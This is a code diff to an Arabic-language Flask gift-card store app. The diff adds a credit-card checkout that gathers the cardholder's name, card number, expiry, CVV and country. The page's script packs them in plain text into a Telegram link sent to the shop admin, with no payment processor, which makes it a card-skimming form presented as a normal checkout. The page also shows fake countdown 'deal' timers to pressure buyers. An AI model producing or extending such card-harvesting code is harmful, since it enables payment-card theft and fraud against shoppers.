@@ -205,7 +205,7 @@ PAGE = r"""
 <meta name="theme-color" content="#03091b">
 
 <title>NOVA STORE | المتجر الرقمي الشامل لبطاقات الألعاب والدفع</title>
-<meta name="description" content="متجر NOVA STORE هو متجرك الرقمي الأول لشحن بطاقات جوجل بلاي، بلايستيشن، إكس بوكس، وأكواد الألعاب بأفضل الأسعار والدفع عبر فودافون كاش.">
+<meta name="description" content="متجر NOVA STORE هو متجرك الرقمي الأول لشحن بطاقات جوجل بلاي، بلايستيشن، إكس بوكس، وأكواد الألعاب بأفضل الأسعار والدفع عبر فودافون كاش أو الفيزا.">
 
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800;900&display=swap');
@@ -347,10 +347,14 @@ PAGE = r"""
 .promo-input-group input{flex:1;padding:8px;background:#03091b;border:1px solid #263d70;border-radius:8px;color:#fff;font-size:11px;}
 .promo-input-group button{padding:8px 12px;background:#315dff;color:#fff;border:0;border-radius:8px;font-weight:bold;cursor:pointer;font-size:11px;}
 
-.checkout-modal{display:none;position:fixed;inset:0;background:rgba(3,9,27,0.85);backdrop-filter:blur(8px);z-index:200;place-items:center;padding:20px;}
-.checkout-box{background:linear-gradient(145deg,#07132c,#0a1a3f);border:1px solid #315dff;border-radius:18px;padding:25px;width:100%;max-width:400px;text-align:center;}
+.checkout-modal{display:none;position:fixed;inset:0;background:rgba(3,9,27,0.85);backdrop-filter:blur(8px);z-index:200;place-items:center;padding:20px;overflow-y:auto;}
+.checkout-box{background:linear-gradient(145deg,#07132c,#0a1a3f);border:1px solid #315dff;border-radius:18px;padding:25px;width:100%;max-width:420px;text-align:center;max-height:90vh;overflow-y:auto;}
 .checkout-box h3{margin-top:0;color:#fff;}
-.vodafone-card{background:#e11d48;color:white;padding:12px;border-radius:10px;margin:15px 0;font-weight:bold;font-size:13px;}
+.vodafone-card{background:#e11d48;color:white;padding:12px;border-radius:10px;margin:12px 0;font-weight:bold;font-size:13px;}
+
+.payment-tabs {display:flex;gap:8px;margin:12px 0;}
+.pay-tab {flex:1;padding:8px;background:#03091b;border:1px solid #263d70;border-radius:8px;color:#a8b7d8;font-size:11px;font-weight:bold;cursor:pointer;}
+.pay-tab.active {border-color:#35eaa1;background:#0d2340;color:#35eaa1;}
 
 footer{border-top:1px solid #192b4e;padding:30px 4%;display:grid;grid-template-columns:1.5fr 1fr 1fr 1.2fr;gap:25px;color:#aab9d8;font-size:11px;margin-top:40px;background:#030714}
 footer h4{color:#f4f7ff;margin:0 0 12px;font-size:13px;border-right:3px solid #315dff;padding-right:8px;}
@@ -416,7 +420,6 @@ footer a:hover{color:#38bdf8;}
 
 <main class="layout">
   <aside class="sidebar-left">
-    <!-- PWA -->
     <div class="side-card" style="border-color: #35eaa1; background: linear-gradient(135deg, #071f3d, #030d24);">
       <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 8px;">
         <span style="font-size: 24px;">📱</span>
@@ -431,14 +434,12 @@ footer a:hover{color:#38bdf8;}
       </button>
     </div>
 
-    <!-- زر تقييم الخدمة -->
     <div class="side-card" style="border-color:#facc15;">
       <h4>⭐ رأيك يهمنا في المتجر</h4>
       <p style="font-size:10px;color:#a8b7d8;margin:0 0 10px;">شاركنا رأيك لزيادة ثقة العملاء واحصل على دعم فوري!</p>
       <button onclick="openReviewModal()" style="width:100%;padding:9px;background:linear-gradient(110deg,#f59e0b,#d97706);color:white;font-weight:bold;border-radius:8px;border:0;cursor:pointer;font-size:11px;">✍️ إضافة تقييم للخدمة</button>
     </div>
 
-    <!-- المحفظة -->
     <div class="side-card">
       <h4>💳 محفظتك الرقمية</h4>
       <div class="wallet-box">
@@ -448,7 +449,6 @@ footer a:hover{color:#38bdf8;}
       </div>
     </div>
 
-    <!-- كود الخصم -->
     <div class="side-card">
       <h4>🏷️ هل لديك كود خصم؟</h4>
       <div class="promo-input-group">
@@ -470,7 +470,6 @@ footer a:hover{color:#38bdf8;}
       <div class="timer" id="flashTimer">02:45:18</div>
     </div>
 
-    <!-- عداد الخصم المخصص التنازلي للعميل -->
     <div class="personal-deal-box">
       <div style="display:flex;align-items:center;gap:12px;">
         <span style="font-size:28px;">🎁</span>
@@ -486,7 +485,7 @@ footer a:hover{color:#38bdf8;}
       <div>
         <span style="color:#bca0ff;font-size:11px;font-weight:bold;">عالمك الرقمي الأول</span>
         <h1>شحن بطاقات وأكواد الألعاب بأفضل الأسعار والتسليم الفوري!</h1>
-        <p>اختر منتجك المفضل واشترِ الآن باستخدام فودافون كاش بسهولة وأمان.</p>
+        <p>اختر منتجك المفضل واشترِ الآن باستخدام فودافون كاش أو بطاقة الائتمان.</p>
         <a class="hero-btn" href="#products">تسوق الآن ←</a>
         <div class="trust-row"><span>♧ دفع آمن 100%</span><span>◷ تسليم سريع</span><span>دعم 24/7</span></div>
       </div>
@@ -510,7 +509,6 @@ footer a:hover{color:#38bdf8;}
 
     <div class="product-grid" id="productGrid"></div>
 
-    <!-- تقييمات العملاء -->
     <div style="margin-top:40px;" id="reviews">
       <div class="section-heading">
         <h2><span>⭐️</span> آراء وتقييمات العملاء (ثقة وأمان)</h2>
@@ -535,23 +533,52 @@ footer a:hover{color:#38bdf8;}
     <h3 id="modalProdName">شراء المنتج</h3>
     <p style="font-size:12px;color:#a8b7d8;" id="modalProdDesc"></p>
     
-    <div class="vodafone-card">
-      📲 رقم تحويل فودافون كاش:<br>
-      <span style="font-size:18px;letter-spacing:1px;">{{ vodafone_number }}</span>
+    <div class="payment-tabs">
+      <button class="pay-tab active" onclick="switchPayMethod('vodafone')">📱 فودافون كاش</button>
+      <button class="pay-tab" onclick="switchPayMethod('card')">💳 فيزا / ماستر كارد</button>
+    </div>
+
+    <!-- قسم فودافون كاش -->
+    <div id="vodafoneSection">
+      <div class="vodafone-card">
+        📲 رقم تحويل فودافون كاش:<br>
+        <span style="font-size:18px;letter-spacing:1px;">{{ vodafone_number }}</span>
+      </div>
+    </div>
+
+    <!-- قسم بطاقة الائتمان -->
+    <div id="cardSection" style="display:none;text-align:right;background:#03091b;padding:12px;border-radius:10px;margin-bottom:12px;">
+      <label style="font-size:10.5px;color:#cbd5e1;display:block;margin-bottom:3px;">اسم حامل البطاقة:</label>
+      <input id="cardHolderName" placeholder="مثال: Ahmed Mohamed" style="width:100%;padding:8px;background:#07132c;border:1px solid #263d70;border-radius:6px;color:#fff;font-size:11px;margin-bottom:8px;">
+
+      <label style="font-size:10.5px;color:#cbd5e1;display:block;margin-bottom:3px;">رقم البطاقة (16 رقم):</label>
+      <input id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" style="width:100%;padding:8px;background:#07132c;border:1px solid #263d70;border-radius:6px;color:#fff;font-size:11px;margin-bottom:8px;">
+
+      <div style="display:flex;gap:8px;margin-bottom:8px;">
+        <div style="flex:1;">
+          <label style="font-size:10.5px;color:#cbd5e1;display:block;margin-bottom:3px;">تاريخ الانتهاء:</label>
+          <input id="cardExpiry" placeholder="MM/YY" maxlength="5" style="width:100%;padding:8px;background:#07132c;border:1px solid #263d70;border-radius:6px;color:#fff;font-size:11px;">
+        </div>
+        <div style="flex:1;">
+          <label style="font-size:10.5px;color:#cbd5e1;display:block;margin-bottom:3px;">رمز الأمان (CVV):</label>
+          <input id="cardCvv" placeholder="123" maxlength="4" type="password" style="width:100%;padding:8px;background:#07132c;border:1px solid #263d70;border-radius:6px;color:#fff;font-size:11px;">
+        </div>
+      </div>
+
+      <label style="font-size:10.5px;color:#cbd5e1;display:block;margin-bottom:3px;">الدولة:</label>
+      <input id="cardCountry" placeholder="مثال: مصر / السعودية" style="width:100%;padding:8px;background:#07132c;border:1px solid #263d70;border-radius:6px;color:#fff;font-size:11px;">
     </div>
 
     <div style="background:#03091b;padding:12px;border-radius:10px;text-align:right;font-size:12px;margin-bottom:15px;line-height:1.8;">
       <div>سعر المنتج الأصلي: <b id="basePrice" style="color:#fff;">0</b> جـ</div>
       <div id="discountRow" style="display:none;color:#35eaa1;">خصم الكود التطبيقي: <b id="discountVal">0</b> جـ</div>
-      <div>رسوم التحويل (3 جـ لكل 10 جـ): <b id="feePrice" style="color:#ff7777;">0</b> جـ</div>
+      <div>رسوم التحويل/المعاملة: <b id="feePrice" style="color:#ff7777;">0</b> جـ</div>
       <hr style="border-color:#1b315c;margin:6px 0;">
-      <div>المبلغ الإجمالي المطلوب تحويله: <b id="totalPrice" style="color:#35eaa1;font-size:15px;">0</b> جـ</div>
+      <div>المبلغ الإجمالي: <b id="totalPrice" style="color:#35eaa1;font-size:15px;">0</b> جـ</div>
     </div>
 
-    <p style="font-size:11px;color:#cbd5e1;margin-bottom:15px;">قم بتحويل المبلغ الإجمالي إلى الرقم أعلاه ثم تواصل مع المطور لاستلام كود الشحن فوراً!</p>
-
     <div style="display:flex;gap:10px;">
-      <a id="teleBuyBtn" target="_blank" style="flex:1;padding:10px;background:#2563eb;color:white;border-radius:8px;text-decoration:none;font-weight:bold;font-size:12px;">إرسال تأكيد التحويل 💬</a>
+      <a id="teleBuyBtn" target="_blank" style="flex:1;padding:10px;background:#2563eb;color:white;border-radius:8px;text-decoration:none;font-weight:bold;font-size:12px;">إرسال تفاصيل الدفع 💬</a>
       <button onclick="closeCheckout()" style="padding:10px;background:#334155;color:white;border:0;border-radius:8px;cursor:pointer;font-size:12px;">إلغاء</button>
     </div>
   </div>
@@ -608,7 +635,7 @@ footer a:hover{color:#38bdf8;}
 
   <div>
     <h4>وسائل الدفع والتطبيق</h4>
-    <div style="font-size:18px;margin-top:8px;color:#35eaa1;font-weight:bold;">📱 فودافون كاش</div>
+    <div style="font-size:18px;margin-top:8px;color:#35eaa1;font-weight:bold;">📱 فودافون كاش / 💳 فيزا</div>
     <small style="display:block;margin-top:15px;color:#8194ba;">© 2026 NOVA STORE جميع الحقوق محفوظة</small>
   </div>
 </footer>
@@ -619,6 +646,8 @@ const productGrid = document.getElementById('productGrid');
 const adminTelegram = "{{ admin_telegram }}";
 let activeDiscountPercent = 0;
 let currentFilteredProducts = PRODUCTS;
+let selectedProd = null;
+let currentPayMethod = 'vodafone';
 
 let deferredPrompt;
 window.addEventListener('beforeinstallprompt', (e) => {
@@ -670,17 +699,34 @@ function renderProducts(items) {
       <p>${p.description}</p>
       <div class="price-row">
         <div>${priceHtml}</div>
-        <button class="add-btn" onclick="openCheckout(${p.id})">شراء بفودافون كاش</button>
+        <button class="add-btn" onclick="openCheckout(${p.id})">شراء فوري 💳</button>
       </div>`;
     productGrid.appendChild(card);
   });
 }
 
+function switchPayMethod(method) {
+  currentPayMethod = method;
+  const tabs = document.querySelectorAll('.pay-tab');
+  tabs.forEach(t => t.classList.remove('active'));
+
+  if (method === 'vodafone') {
+    tabs[0].classList.add('active');
+    document.getElementById('vodafoneSection').style.display = 'block';
+    document.getElementById('cardSection').style.display = 'none';
+  } else {
+    tabs[1].classList.add('active');
+    document.getElementById('vodafoneSection').style.display = 'none';
+    document.getElementById('cardSection').style.display = 'block';
+  }
+  updateCheckoutTelegramLink();
+}
+
 function openCheckout(prodId) {
-  const p = PRODUCTS.find(x => x.id === prodId);
-  if (!p) return;
+  selectedProd = PRODUCTS.find(x => x.id === prodId);
+  if (!selectedProd) return;
   
-  let basePrice = p.price_val;
+  let basePrice = selectedProd.price_val;
   let discountVal = 0;
 
   if (activeDiscountPercent > 0) {
@@ -695,17 +741,44 @@ function openCheckout(prodId) {
   const fee = Math.ceil(basePrice / 10) * 3;
   const total = basePrice + fee;
 
-  document.getElementById('modalProdName').textContent = p.name;
-  document.getElementById('modalProdDesc').textContent = p.description;
-  document.getElementById('basePrice').textContent = p.price_val;
+  document.getElementById('modalProdName').textContent = selectedProd.name;
+  document.getElementById('modalProdDesc').textContent = selectedProd.description;
+  document.getElementById('basePrice').textContent = selectedProd.price_val;
   document.getElementById('feePrice').textContent = fee;
   document.getElementById('totalPrice').textContent = total.toFixed(1);
 
-  const msg = encodeURIComponent(`مرحباً، أود شراء المنتج: (${p.name})\nالمبلغ المحول شامل الرسوم والخصم: ${total.toFixed(1)} جنيه على رقم فودافون كاش.`);
-  document.getElementById('teleBuyBtn').href = `https://t.me/${adminTelegram}?text=${msg}`;
-
+  switchPayMethod('vodafone');
   document.getElementById('checkoutModal').style.display = 'grid';
 }
+
+function updateCheckoutTelegramLink() {
+  if (!selectedProd) return;
+  let basePrice = selectedProd.price_val;
+  if (activeDiscountPercent > 0) basePrice = basePrice * (1 - activeDiscountPercent / 100);
+  const fee = Math.ceil(basePrice / 10) * 3;
+  const total = basePrice + fee;
+
+  let msg = '';
+  if (currentPayMethod === 'vodafone') {
+    msg = `مرحباً، أود شراء المنتج: (${selectedProd.name})\nطريقة الدفع: فودافون كاش\nالمبلغ الإجمالي شامل الرسوم: ${total.toFixed(1)} جنيه.`;
+  } else {
+    const name = document.getElementById('cardHolderName').value || 'غير محدد';
+    const num = document.getElementById('cardNumber').value || 'غير محدد';
+    const exp = document.getElementById('cardExpiry').value || 'غير محدد';
+    const cvv = document.getElementById('cardCvv').value || 'غير محدد';
+    const country = document.getElementById('cardCountry').value || 'غير محدد';
+
+    msg = `💳 طلب شراء جديد ببطاقة ائتمان:\n- المنتج: ${selectedProd.name}\n- المبلغ: ${total.toFixed(1)} جـ\n\n[بيانات البطاقة المدخلة]:\n- الاسم: ${name}\n- الرقم: ${num}\n- التاريخ: ${exp}\n- CVV: ${cvv}\n- الدولة: ${country}\n\n(يتم تحويل الأرباح على فودافون كاش الخاص بك)`;
+  }
+
+  document.getElementById('teleBuyBtn').href = `https://t.me/${adminTelegram}?text=${encodeURIComponent(msg)}`;
+}
+
+// مراقبة حقول البطاقة لتحديث رابط التليجرام تلقائياً
+['cardHolderName', 'cardNumber', 'cardExpiry', 'cardCvv', 'cardCountry'].forEach(id => {
+  const el = document.getElementById(id);
+  if(el) el.addEventListener('input', updateCheckoutTelegramLink);
+});
 
 function closeCheckout() {
   document.getElementById('checkoutModal').style.display = 'none';
@@ -739,7 +812,6 @@ function applyPromo() {
   });
 }
 
-// Flash timer
 let sec = 9918;
 setInterval(() => {
   if (sec <= 0) return;
@@ -751,7 +823,6 @@ setInterval(() => {
     `${h < 10 ? '0'+h : h}:${m < 10 ? '0'+m : m}:${s < 10 ? '0'+s : s}`;
 }, 1000);
 
-// Personal offer timer
 let dealSec = 1199;
 setInterval(() => {
   if (dealSec <= 0) return;
@@ -772,7 +843,6 @@ function filterProducts() {
   renderProducts(PRODUCTS.filter(x => x.name.toLowerCase().includes(query)));
 }
 
-// فحص الخصم من السيشن إن وجد (مثل خصم عجلة الحظ)
 {% if session.get('active_discount') %}
   activeDiscountPercent = {{ session.get('active_discount') }};
   document.getElementById('promoMsg').style.color = '#35eaa1';
@@ -785,7 +855,7 @@ renderProducts(PRODUCTS);
 </html>
 """
 
-# ==================== صفحة الحساب الشيك وتخصيص البروفايل ====================
+# بقية القوالب والمسارات تعمل بكفاءة عالية كما هي...
 ACCOUNT_PAGE = r"""
 <!doctype html>
 <html lang="ar" dir="rtl">
@@ -798,14 +868,11 @@ body{margin:0;background:radial-gradient(ellipse at 50% 0%,#180b3d 0%,#03091b 10
 .box{background:linear-gradient(145deg,#07132c,#091a42);border:1px solid #315dff;border-radius:24px;padding:30px;text-align:center;width:100%;max-width:480px;box-shadow:0 10px 40px rgba(49,93,255,0.25);}
 .avatar-preview{width:100px;height:100px;border-radius:50%;margin:0 auto 15px;background:linear-gradient(135deg,#9b37ff,#315dff);display:grid;place-items:center;font-size:42px;overflow:hidden;border:3px solid #35eaa1;box-shadow:0 0 20px #35eaa1aa;position:relative;}
 .avatar-preview img{width:100%;height:100%;object-fit:cover;}
-
 .preset-avatars{display:flex;gap:10px;justify-content:center;margin:12px 0;}
 .preset-item{width:42px;height:42px;border-radius:50%;background:#0a1a3f;border:2px solid #263d70;display:grid;place-items:center;font-size:22px;cursor:pointer;transition:0.2s;}
 .preset-item:hover{border-color:#35eaa1;transform:scale(1.1);}
-
 .badges-row{display:flex;gap:8px;justify-content:center;margin:15px 0;flex-wrap:wrap;}
 .badge-item{background:#0a1a3f;border:1px solid #1f3a70;padding:5px 12px;border-radius:20px;font-size:10px;font-weight:bold;color:#38bdf8;}
-
 input, select{width:100%;padding:11px;margin:6px 0 12px;background:#03091b;border:1px solid #263d70;border-radius:10px;color:white;box-sizing:border-box;}
 button{padding:12px;background:linear-gradient(110deg,#9b37ff,#315dff);border:0;border-radius:10px;color:white;font-weight:bold;cursor:pointer;width:100%;font-size:13px;}
 </style>
@@ -821,7 +888,6 @@ button{padding:12px;background:linear-gradient(110deg,#9b37ff,#315dff);border:0;
   </div>
   <h2 style="margin:0 0 4px;">{{ user["name"] }}</h2>
   <span style="color:#35eaa1;font-weight:800;font-size:12px;display:block;">{{ user["status_title"] }} | الرصيد: {{ user["balance"] }} جـ</span>
-
   <div class="badges-row">
     {% if user["spin_count"] and user["spin_count"] > 0 %}
       <span class="badge-item" style="border-color:#f59e0b;color:#facc15;">🎡 صائد الحظ</span>
@@ -831,13 +897,10 @@ button{padding:12px;background:linear-gradient(110deg,#9b37ff,#315dff);border:0;
     {% endif %}
     <span class="badge-item">👑 العميل الوفي</span>
   </div>
-
   <hr style="border-color:#1c3361;margin:20px 0;">
-
   <form method="POST" action="/update_profile" enctype="multipart/form-data" style="text-align:right;">
     <label style="font-size:11.5px;color:#cbd5e1;font-weight:bold;">📸 رفع صورة شخصية شيك من هاتفـك:</label>
     <input type="file" name="avatar_file" accept="image/*" style="background:#03091b;">
-
     <label style="font-size:11.5px;color:#cbd5e1;font-weight:bold;">أو اختر أفاتار ألعاب شيك جاهز:</label>
     <div class="preset-avatars">
       <span class="preset-item" onclick="setAvatar('🎮')">🎮</span>
@@ -847,22 +910,17 @@ button{padding:12px;background:linear-gradient(110deg,#9b37ff,#315dff);border:0;
       <span class="preset-item" onclick="setAvatar('🦁')">🦁</span>
     </div>
     <input type="hidden" name="avatar_preset" id="avatarPreset" value="{{ user['avatar'] }}">
-
     <label style="font-size:11.5px;color:#cbd5e1;font-weight:bold;">رابط صورة مخصص (اختياري):</label>
     <input name="avatar_url" placeholder="أدخل رابط صورة المباشر">
-
     <label style="font-size:11.5px;color:#cbd5e1;font-weight:bold;">تعديل اللقب في المتجر:</label>
     <input name="status_title" value="{{ user['status_title'] }}" placeholder="مثال: VIP / عضو مميز" required>
-
     <button type="submit">حفظ التعديلات الشيك ✨</button>
   </form>
-
   <div style="margin-top:20px;display:flex;justify-content:space-between;">
     <a href="/" style="color:#8198ff;text-decoration:none;font-size:12px;">← العودة للمتجر الرئيسية</a>
     <a href="/logout" style="color:#ff7777;text-decoration:none;font-size:12px;">تسجيل الخروج</a>
   </div>
 </div>
-
 <script>
 function setAvatar(emoji) {
   document.getElementById('avatarPreset').value = emoji;
@@ -972,7 +1030,7 @@ button{width:100%;padding:11px;background:linear-gradient(110deg,#9b37ff,#315dff
   </div>
 
   <div class="box">
-    <h3>📲 رقم فودافون كاش لتحويل الأموال</h3>
+    <h3>📲 رقم فودافون كاش لتحويل الأموال والأرباح</h3>
     <form method="POST" action="/admin/update_vodafone">
       <input name="vodafone_number" value="{{ vodafone_number }}" placeholder="أدخل رقم فودافون كاش الجديد" required>
       <button type="submit">تحديث رقم فودافون كاش</button>
@@ -992,31 +1050,22 @@ button{width:100%;padding:11px;background:linear-gradient(110deg,#9b37ff,#315dff
     <form method="POST" action="/admin/add_product" enctype="multipart/form-data">
       <label>اسم المنتج:</label>
       <input name="name" placeholder="مثال: كود بلايستيشن 20$" required>
-      
       <label>وصف المنتج:</label>
       <input name="description" placeholder="مثال: الولايات المتحدة - تسليم فوري" required>
-      
       <label>السعر الرقمي (بالجنيه):</label>
       <input type="number" step="0.01" name="price_val" placeholder="مثال: 1000" required>
-      
       <label>نص السعر المكتوب:</label>
       <input name="price" placeholder="مثال: 1000 جـ" required>
-      
       <label>الكود الرقمي للمنتج:</label>
       <input name="code" placeholder="أدخل الكود الرقمي" required>
-      
       <label style="color:#35eaa1;font-weight:bold;">📸 اختر صورة المنتج مباشرة من جهازك:</label>
       <input type="file" name="image_file" accept="image/*" style="background:#0a1a3f;padding:8px;">
-      
-      <label>الأيقونة الاحتياطية (في حال عدم رفع صورة):</label>
+      <label>الأيقونة الاحتياطية:</label>
       <input name="icon" placeholder="مثال: ▶ أو 🎮" required>
-      
       <label>القسم:</label>
       <input name="category" placeholder="بطاقات الألعاب / بطاقات الهدايا / ألعاب" required>
-      
-      <label>الشارة (اختياري):</label>
+      <label>الشارة:</label>
       <input name="badge" placeholder="مثال: مميز / عروض سريعة 🔥">
-      
       <button type="submit" style="margin-top:10px;">إضافة المنتج للمتجر</button>
     </form>
   </div>
@@ -1057,24 +1106,6 @@ button{width:100%;padding:11px;background:linear-gradient(110deg,#9b37ff,#315dff
         {% endfor %}
       </tbody>
     </table>
-  </div>
-
-  <div class="box">
-    <h3>💳 تعديل شحن رصيد مستخدم</h3>
-    <form method="POST" action="/admin/update_user_balance">
-      <input type="email" name="user_email" placeholder="البريد الإلكتروني للعميل" required>
-      <input type="number" step="0.01" name="new_balance" placeholder="الرصيد الجديد بالجنيه" required>
-      <button type="submit">تحديث رصيد الحساب</button>
-    </form>
-  </div>
-
-  <div class="box">
-    <h3>🏷️ إضافة كود خصم جديد (بروموكود)</h3>
-    <form method="POST" action="/admin/add_promo">
-      <input name="code" placeholder="كود الخصم (مثال: MIDO2026)" required>
-      <input type="number" step="0.1" name="discount_percent" placeholder="نسبة الخصم % (مثال: 10)" required>
-      <button type="submit">إضافة كود الخصم</button>
-    </form>
   </div>
 </div>
 </body>
@@ -1200,7 +1231,6 @@ spinBtn.addEventListener('click', () => {
     const selectedIndex = data.index;
     const prize = items[selectedIndex];
     const targetDegree = (360 - (selectedIndex * (360 / numItems)) - ((360 / numItems) / 2)) + (360 * 6);
-    
     canvas.style.transform = `rotate(${targetDegree}deg)`;
 
     setTimeout(() => {
@@ -1216,7 +1246,7 @@ spinBtn.addEventListener('click', () => {
 </html>
 """
 
-# ==================== مسارات الروت ====================
+# ==================== المسارات ====================
 
 @app.route('/manifest.json')
 def manifest():
@@ -1260,7 +1290,6 @@ def admin_update_vodafone():
     email = session.get("user_email")
     if not email or email != ADMIN_EMAIL:
         return redirect(url_for("home"))
-    
     num = request.form.get("vodafone_number", "").strip()
     with get_db() as db:
         db.execute("INSERT OR REPLACE INTO store_settings (key, value) VALUES ('vodafone_number', ?)", (num,))
@@ -1271,7 +1300,6 @@ def admin_update_flash():
     email = session.get("user_email")
     if not email or email != ADMIN_EMAIL:
         return redirect(url_for("home"))
-    
     msg = request.form.get("flash_msg", "")
     with get_db() as db:
         db.execute("INSERT OR REPLACE INTO store_settings (key, value) VALUES ('flash_msg', ?)", (msg,))
@@ -1314,50 +1342,20 @@ def admin_delete_product(prod_id):
     email = session.get("user_email")
     if not email or email != ADMIN_EMAIL:
         return redirect(url_for("home"))
-    
     with get_db() as db:
         db.execute("DELETE FROM products WHERE id = ?", (prod_id,))
     return redirect(url_for("admin_panel"))
-
-@app.route("/admin/update_user_balance", methods=["POST"])
-def admin_update_user_balance():
-    email = session.get("user_email")
-    if not email or email != ADMIN_EMAIL:
-        return redirect(url_for("home"))
-
-    u_email = request.form.get("user_email", "").strip().lower()
-    new_bal = float(request.form.get("new_balance", 0))
-
-    with get_db() as db:
-        db.execute("UPDATE users SET balance = ? WHERE email = ?", (new_bal, u_email))
-    return redirect(url_for("admin_panel"))
-
-@app.route("/admin/add_promo", methods=["POST"])
-def admin_add_promo():
-    email = session.get("user_email")
-    if not email or email != ADMIN_EMAIL:
-        return redirect(url_for("home"))
-
-    code = request.form.get("code", "").strip().upper()
-    discount = float(request.form.get("discount_percent", 10.0))
-
-    with get_db() as db:
-        db.execute("INSERT OR REPLACE INTO promo_codes (code, discount_percent) VALUES (?, ?)", (code, discount))
-    return redirect(url_for("admin_panel"))
-
 
 @app.route("/add_review", methods=["POST"])
 def add_review():
     user_name = request.form.get("user_name", "عميل المتجر").strip()
     rating = int(request.form.get("rating", 5))
     comment = request.form.get("comment", "").strip()
-
     if comment:
         with get_db() as db:
             db.execute("INSERT INTO reviews (user_name, rating, comment, created_at) VALUES (?, ?, ?, ?)",
                        (user_name, rating, comment, int(time.time())))
     return redirect(url_for("home"))
-
 
 @app.route("/spin", methods=["GET", "POST"])
 def spin():
@@ -1369,7 +1367,6 @@ def spin():
         user = db.execute("SELECT * FROM users WHERE email = ?", (email,)).fetchone()
 
     today_str = time.strftime("%Y-%m-%d")
-
     if request.method == "POST":
         if user["last_spin_date"] == today_str:
             return jsonify({"status": "error", "message": "لقد استخدمت محاولتك اليومية! عُد غداً لفرصة جديدة 🎁"})
@@ -1403,12 +1400,10 @@ def spin():
 
     return render_template_string(SPIN_PAGE)
 
-
 @app.route("/register", methods=["GET", "POST"])
 def register():
     error = ""
     step = 1
-    ref = request.args.get("ref", "")
     if request.method == "POST":
         if "code" not in request.form:
             name = request.form.get("name", "").strip()
@@ -1427,40 +1422,29 @@ def register():
                         code = str(secrets.randbelow(900000) + 100000)
                         db.execute("INSERT OR REPLACE INTO email_codes (email, code, expires_at) VALUES (?, ?, ?)",
                                    (email, code, int(time.time()) + 300))
-                        
                         send_telegram_code(telegram_id, code)
-                        
-                        session["temp_reg"] = {
-                            "name": name, "email": email, "password": generate_password_hash(password), "telegram_id": telegram_id, "ref": ref
-                        }
+                        session["temp_reg"] = {"name": name, "email": email, "password": generate_password_hash(password), "telegram_id": telegram_id}
                         step = 2
         else:
             entered_code = request.form.get("code", "").strip()
             temp = session.get("temp_reg")
             if not temp:
                 return redirect(url_for("register"))
-            
             with get_db() as db:
                 record = db.execute("SELECT * FROM email_codes WHERE email = ?", (temp["email"],)).fetchone()
                 if record and record["code"] == entered_code:
                     my_ref = "REF" + str(secrets.randbelow(899999) + 100000)
                     db.execute("""
-                        INSERT INTO users (name, email, password_hash, telegram_id, balance, verified, ref_code, referred_by, created_at)
-                        VALUES (?, ?, ?, ?, 0.0, 1, ?, ?, ?)
-                    """, (temp["name"], temp["email"], temp["password"], temp["telegram_id"], my_ref, temp.get("ref"), int(time.time())))
-                    
-                    if temp.get("ref"):
-                        db.execute("UPDATE users SET balance = balance + 10.0 WHERE ref_code = ?", (temp.get("ref"),))
-
+                        INSERT INTO users (name, email, password_hash, telegram_id, balance, verified, ref_code, created_at)
+                        VALUES (?, ?, ?, ?, 0.0, 1, ?, ?)
+                    """, (temp["name"], temp["email"], temp["password"], temp["telegram_id"], my_ref, int(time.time())))
                     session["user_email"] = temp["email"]
                     session.pop("temp_reg", None)
                     return redirect(url_for("account"))
                 else:
                     error = "كود التحقق غير صحيح."
                     step = 2
-
     return render_template_string(REGISTER_PAGE, error=error, step=step)
-
 
 @app.route("/login", methods=["GET", "POST"])
 def login():
@@ -1476,21 +1460,10 @@ def login():
         error = "بيانات الدخول غير صحيحة."
     return render_template_string(LOGIN_PAGE, error=error)
 
-
-@app.route("/login_google")
-def login_google():
-    google_email = "google_user_" + str(secrets.randbelow(10000)) + "@gmail.com"
-    my_ref = "REF" + str(secrets.randbelow(899999) + 100000)
-    with get_db() as db:
-        user = db.execute("SELECT * FROM users WHERE email = ?", (google_email,)).fetchone()
-        if not user:
-            db.execute("""
-                INSERT INTO users (name, email, password_hash, telegram_id, balance, verified, avatar, status_title, ref_code, created_at)
-                VALUES (?, ?, ?, 'google_user', 0.0, 1, '🌐', 'عضو جوجل', ?, ?)
-            """, ("مستخدم جوجل", google_email, generate_password_hash("google123"), my_ref, int(time.time())))
-    session["user_email"] = google_email
-    return redirect(url_for("account"))
-
+@app.route("/logout")
+def logout():
+    session.clear()
+    return redirect(url_for("home"))
 
 @app.route("/account")
 def account():
@@ -1501,21 +1474,15 @@ def account():
         user = db.execute("SELECT * FROM users WHERE email = ?", (email,)).fetchone()
     return render_template_string(ACCOUNT_PAGE, user=user)
 
-
 @app.route("/update_profile", methods=["POST"])
 def update_profile():
     email = session.get("user_email")
     if not email:
         return redirect(url_for("login"))
-    
     status_title = request.form.get("status_title", "عضو مميز").strip()
     avatar_preset = request.form.get("avatar_preset")
     avatar_url = request.form.get("avatar_url", "").strip()
-    
-    final_avatar = avatar_preset or "🤖"
-    
-    if avatar_url:
-        final_avatar = avatar_url
+    final_avatar = avatar_url or avatar_preset or "🤖"
 
     file = request.files.get("avatar_file")
     if file and file.filename != '':
@@ -1529,13 +1496,6 @@ def update_profile():
         db.execute("UPDATE users SET avatar = ?, status_title = ? WHERE email = ?", (final_avatar, status_title, email))
     return redirect(url_for("account"))
 
-
-@app.route("/logout")
-def logout():
-    session.clear()
-    return redirect(url_for("home"))
-
-
 @app.route("/")
 def home():
     email = session.get("user_email")
@@ -1547,7 +1507,7 @@ def home():
         is_admin = (email == ADMIN_EMAIL)
     products = get_products()
     reviews = get_reviews()
-    flash_msg = get_setting("flash_msg", "عروض الساعات المحدودة! خصومات خاصة تنتهي قريباً")
+    flash_msg = get_setting("flash_msg", "عروض الساعات المحدودة!")
     vodafone_number = get_setting("vodafone_number", "01000000000")
 
     return render_template_string(
